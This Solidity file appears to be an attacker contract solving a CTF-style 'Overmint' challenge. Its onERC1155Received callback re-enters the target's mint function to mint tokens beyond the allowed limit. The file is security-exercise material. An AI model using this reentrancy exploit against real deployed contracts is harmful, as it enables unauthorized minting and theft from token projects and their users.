// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface Overmint {
    function mint(uint256, bytes calldata) external;
}
contract Overmint1_ERC1155_Attacker is IERC1155Receiver {

    Overmint overmint;

    uint256 count;

    constructor(address _overmint) {
        overmint = Overmint(_overmint);
    }

    function attack() external {
        overmint.mint(0, "");
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        if (count < 4) {
            count++;
            overmint.mint(0, "");
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external virtual returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return true;
    }
}